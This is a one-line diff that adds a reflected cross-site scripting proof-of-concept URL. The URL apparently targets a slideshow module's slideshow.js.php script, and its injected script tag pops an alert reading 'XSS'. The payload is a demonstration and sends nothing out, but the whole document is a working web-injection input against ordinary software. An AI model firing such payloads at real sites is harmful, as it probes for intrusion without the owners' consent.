@@ -1,0 +1,1 @@
+http://www.example.com/modules/slideshowmodule/slideshow.js.php?u=%3Cscript%3Ewindow.alert(String.fromCharCode(88,83,83));%3C/script%3E
